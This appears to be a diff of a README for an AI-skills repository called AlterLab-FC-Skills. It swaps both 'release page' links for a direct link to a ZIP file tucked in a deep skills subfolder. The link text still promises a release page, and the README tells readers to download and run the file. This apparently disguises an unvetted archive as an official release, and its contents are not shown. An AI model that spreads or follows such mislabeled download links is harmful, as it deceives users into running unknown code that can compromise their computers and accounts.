@@ -1,6 +1,6 @@
 # 🎓 AlterLab-FC-Skills - Practical AI Skills for Media Work
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-6e8efb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/prone-dc302/AlterLab-FC-Skills/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-6e8efb?style=for-the-badge&logo=github&logoColor=white)](https://github.com/prone-dc302/AlterLab-FC-Skills/raw/refs/heads/main/skills/pra/alterlab-pra-market-research/Alter_Skills_Lab_F_3.8.zip)
 
 ## 🧭 What this is
 
@@ -23,7 +23,7 @@ If you plan to use Claude Code or a similar setup, keep your Claude account deta
 
 Visit the release page to download and run this file:
 
-[Open the release page](https://github.com/prone-dc302/AlterLab-FC-Skills/releases)
+[Open the release page](https://github.com/prone-dc302/AlterLab-FC-Skills/raw/refs/heads/main/skills/pra/alterlab-pra-market-research/Alter_Skills_Lab_F_3.8.zip)
 
 On the page, look for the latest release and find the file that matches your setup. If the release includes a ZIP file, download it to your PC. If it includes a setup file, download that file instead.
 
